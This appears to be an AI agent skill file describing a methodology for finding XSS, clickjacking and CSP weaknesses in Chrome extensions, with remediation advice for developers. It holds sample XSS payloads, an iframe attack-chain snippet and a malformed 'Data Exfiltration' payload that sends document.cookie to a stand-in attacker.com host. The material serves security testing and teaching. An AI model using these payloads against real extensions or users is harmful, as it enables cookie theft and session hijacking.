---
name: browser-extension-xss-testing
description: How to test browser extensions for XSS vulnerabilities including iframe-based XSS, DOM-based XSS, and clickjacking attacks. Use this skill whenever the user mentions browser extension security testing, Chrome extension vulnerabilities, XSS in extensions, web_accessible_resources exploitation, or CSP bypass in extensions. Make sure to use this skill for any pentesting task involving browser extensions, even if the user doesn't explicitly mention XSS.
---

# Browser Extension XSS Testing Methodology

This skill provides a systematic approach to identifying and testing Cross-Site Scripting (XSS) vulnerabilities in browser extensions, particularly Chrome extensions.

## When to Use This Skill

Use this skill when:
- Testing browser extensions for security vulnerabilities
- Analyzing extension code for XSS risks
- Reviewing extension manifests for security misconfigurations
- Investigating web_accessible_resources exposure
- Testing Content Security Policy (CSP) effectiveness
- Performing penetration testing on extension-based applications

## Core Vulnerability Patterns

### 1. Iframe-Based XSS

**What to look for:**
- Extensions that create iframes with user-controlled URLs
- Query parameters passed to iframe sources
- Dynamic content injection into iframe pages

**Testing approach:**

1. **Identify iframe creation code:**
   ```javascript
   // Look for patterns like:
   frame.src = constructedURL
   document.createElement("iframe")
   iframe.src = someDynamicValue
   ```

2. **Check for parameter injection:**
   - Find where URL parameters are constructed
   - Verify if user input flows into `?param=value` portions
   - Test with XSS payloads in parameter values

3. **Test payload delivery:**
   ```javascript
   // Example test payload
   let xssPayload = "<img src='invalid' onerror='alert("XSS")'>"
   let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`
   ```

4. **Verify CSP configuration:**
   - Check `manifest.json` for `content_security_policy`
   - Look for `'unsafe-eval'` or `'unsafe-inline'` directives
   - Test if scripts execute despite CSP

### 2. DOM-Based XSS

**What to look for:**
- Direct DOM manipulation with user input
- jQuery `.html()` or `.append()` with untrusted data
- String concatenation building HTML
- Input fields that affect page content

**Testing approach:**

1. **Identify dangerous patterns:**
   ```javascript
   // Vulnerable: string concatenation + DOM insertion
   element.html('<span>' + userInput + '</span>')
   element.append(userContent)
   document.body.innerHTML = userValue
   ```

2. **Test input fields:**
   - Find all `<input>` elements in extension pages
   - Submit XSS payloads: `<img src=x onerror=alert(1)>`
   - Check if payload renders as HTML or text

3. **Check jQuery usage:**
   - jQuery's `.html()` and `.append()` can execute scripts
   - These methods use `globalEval()` internally
   - Test with script tags: `<script>alert(1)</script>`

4. **Verify sanitization:**
   - Look for `.text()` instead of `.html()`
   - Check for DOMPurify or similar sanitization
   - Test if sanitization is bypassed

### 3. ClickJacking + DOM XSS Combination

**What to look for:**
- `web_accessible_resources` exposing HTML pages
- Pages that can be framed (no X-Frame-Options)
- DOM XSS that requires user interaction

**Testing approach:**

1. **Check web_accessible_resources:**
   ```json
   // In manifest.json
   "web_accessible_resources": [
       "html/bookmarks.html",  // Vulnerable if framed
       "dist/*",
       "assets/*"
   ]
   ```

2. **Test framing capability:**
   - Create a test page with iframe pointing to extension page
   - URL format: `chrome-extension://[extension-id]/[page-path]`
   - Check if page loads in iframe

3. **Combine with DOM XSS:**
   - If DOM XSS requires clicking a button
   - Use clickjacking to force the click
   - Overlay transparent iframe on attacker page
   - Position to make user click extension button unknowingly

4. **Test the attack chain:**
   ```javascript
   // Create iframe with extension page
   let newFrame = document.createElement("iframe")
   newFrame.src = "chrome-extension://[id]/page.html?param=payload"
   document.body.append(newFrame)
   ```

## Content Security Policy Analysis

### Dangerous CSP Directives

| Directive | Risk | What it allows |
|-----------|------|----------------|
| `'unsafe-eval'` | High | `eval()`, `Function()` constructor |
| `'unsafe-inline'` | High | Inline `<script>` tags |
| `script-src *` | High | Scripts from any origin |
| Missing CSP | Medium | Default browser policies apply |

### Testing CSP Bypass

1. **Check manifest.json:**
   ```json
   {
     "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
   }
   ```

2. **Test eval-based execution:**
   ```javascript
   // If 'unsafe-eval' is present, test:
   eval("alert('CSP bypass')")
   new Function("alert('CSP bypass')")()
   ```

3. **Test inline scripts:**
   ```javascript
   // If 'unsafe-inline' is present, test:
   document.body.innerHTML = '<script>alert(1)</script>'
   ```

## Testing Checklist

### Manifest Analysis
- [ ] Review `content_security_policy` for unsafe directives
- [ ] Check `web_accessible_resources` for exposed HTML pages
- [ ] Verify `permissions` don't grant excessive access
- [ ] Look for `externally_connectable` configuration

### Code Review
- [ ] Search for `.html()`, `.append()`, `.innerHTML` with variables
- [ ] Find iframe creation with dynamic sources
- [ ] Identify URL parameter handling
- [ ] Check for `eval()`, `Function()`, `setTimeout()` with strings
- [ ] Look for `chrome.storage` data flowing to DOM

### Runtime Testing
- [ ] Inject XSS payloads into all input fields
- [ ] Test URL parameters with encoded payloads
- [ ] Attempt to frame extension pages
- [ ] Verify CSP enforcement in DevTools console
- [ ] Check for console errors indicating blocked scripts

### Payload Testing

**Basic XSS:**
```html
<img src=x onerror=alert(1)>
<script>alert(1)</script>
<svg onload=alert(1)>
```

**Event Handler XSS:**
```html
<body onload=alert(1)>
<div onmouseover=alert(1)>
<input onfocus=alert(1) autofocus>
```

**Data Exfiltration:**
```html
<img src=https://attacker.com/steal?data=
```javascript
encodeURIComponent(document.cookie)
```

## Common Extension Vulnerabilities

### 1. Storage Data Injection
```javascript
// Vulnerable pattern
chrome.storage.local.get("userMessage", (result) => {
  document.body.innerHTML = result.userMessage  // XSS!
})
```

**Fix:** Use `.text()` or sanitize with DOMPurify

### 2. URL Parameter Injection
```javascript
// Vulnerable pattern
let param = new URLSearchParams(window.location.search).get("content")
$("#output").html(param)  // XSS!
```

**Fix:** Validate and sanitize all URL parameters

### 3. Web Accessible Resource Framing
```json
// Vulnerable manifest
"web_accessible_resources": ["*.html"]
```

**Fix:** Limit to specific files, add X-Frame-Options headers

## Remediation Guidelines

### For Developers

1. **Use safe DOM methods:**
   ```javascript
   // Instead of .html()
   element.text(userInput)
   
   // Or sanitize
   element.html(DOMPurify.sanitize(userInput))
   ```

2. **Tighten CSP:**
   ```json
   {
     "content_security_policy": "script-src 'self'; object-src 'self';"
   }
   ```

3. **Limit web_accessible_resources:**
   ```json
   {
     "web_accessible_resources": [
       {"resources": ["assets/*.png"], "matches": ["<all_urls>"]}
     ]
   }
   ```

4. **Validate all inputs:**
   - Never trust user input, storage data, or URL parameters
   - Use allowlists for expected values
   - Encode output based on context (HTML, JS, URL)

### For Pentesters

1. **Document findings clearly:**
   - Include vulnerable code snippets
   - Show proof-of-concept payloads
   - Explain impact and exploitation path

2. **Prioritize by severity:**
   - DOM XSS with clickjacking: Critical
   - Iframe XSS with unsafe-eval: High
   - Stored XSS in extension storage: High
   - Reflected XSS requiring interaction: Medium

3. **Test in context:**
   - Verify attacks work in actual extension environment
   - Check if CSP blocks the payload
   - Confirm user interaction requirements

## References

- [When Extension Pages Are Web Accessible](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
- [Steam Fire and Paste - UXSS via DOM XSS + Clickjacking](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)
- [Chrome Extension Security Best Practices](https://developer.chrome.com/docs/extensions/mv3/security/)
- [Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)

## Quick Start

When testing a browser extension:

1. **Download and inspect the extension** - Extract `.crx` or view source in Chrome
2. **Review manifest.json** - Check CSP and web_accessible_resources
3. **Search for dangerous patterns** - Look for `.html()`, `.append()`, iframe creation
4. **Test input fields** - Submit XSS payloads to all user inputs
5. **Test URL parameters** - Modify query strings with encoded payloads
6. **Attempt framing** - Try to load extension pages in iframes
7. **Verify CSP** - Check if payloads execute or are blocked
8. **Document findings** - Record vulnerable code and proof-of-concept
